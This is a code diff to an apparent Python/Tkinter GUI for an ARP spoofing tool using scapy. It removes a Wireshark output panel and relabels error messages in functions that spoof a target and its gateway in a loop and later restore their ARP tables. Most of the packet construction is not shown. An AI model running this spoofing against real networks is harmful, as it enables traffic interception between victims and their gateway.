@@ -9,18 +9,16 @@ import traceback
 
 from tkinter import *
 
-def startArp(targetIp, defaultGatewayIp, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
+def startArp(targetIp, defaultGatewayIp, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
 
-    global arpIsrunning, arpThreads, terminalLabel, wiresharkLabel, errorOutputLabel
+    global arpIsrunning, arpThreads, terminalLabel, errorOutputLabel
 
     arpIsrunning = False
     arpThreads = threading.Thread(target = lambda : arpLoop(targetIp, defaultGatewayIp))
 
     terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
-    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     terminalLabel.configure(bg = colorConfig) 
-    wiresharkLabel.configure(bg = colorConfig)
     errorOutputLabel.configure(bg = colorConfig)
     
     terminalLabel["text"] += "$ Target IP = " + targetIp + "\n"
@@ -46,7 +44,7 @@ def stopArp(targetIp, defaultGatewayIp) :
     except (AttributeError, RuntimeError):
         errorOutputLabel["text"] += traceback.format_exc()
     except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"
+        errorOutputLabel["text"] += "ERROR STOP : \n" + e + "\n"
 
 def runArpAttack(targetIp, defaultGatewayIp):
     global arpThreads, arpIsrunning
@@ -60,7 +58,7 @@ def arpLoop(targetIp, defaultGatewayIp):
             spoof(defaultGatewayIp, targetIp)
             time.sleep(2)
     except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+        errorOutputLabel["text"] += "ERROR ARP LOOP: \n" + str(e) + "\n"
 
 def get_mac(targetIp):
     try :
@@ -71,7 +69,7 @@ def get_mac(targetIp):
 
         return answered_list[0][1].hwsrc
     except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+        errorOutputLabel["text"] += "ERROR GET_MAC: \n" + str(e) + "\n"
 
 def spoof(targetIp, defaultGatewayIp):
     try :
@@ -81,7 +79,7 @@ def spoof(targetIp, defaultGatewayIp):
     
         scapy.send(packet, verbose = False)
     except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+        errorOutputLabel["text"] += "ERROR SPOOF : \n" + str(e) + "\n"
 
 
 def restore(destination_ip, source_ip):
@@ -94,4 +92,4 @@ def restore(destination_ip, source_ip):
     
         scapy.send(packet, verbose = False)
     except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+        errorOutputLabel["text"] += "ERROR RESTORE : \n" + str(e) + "\n"
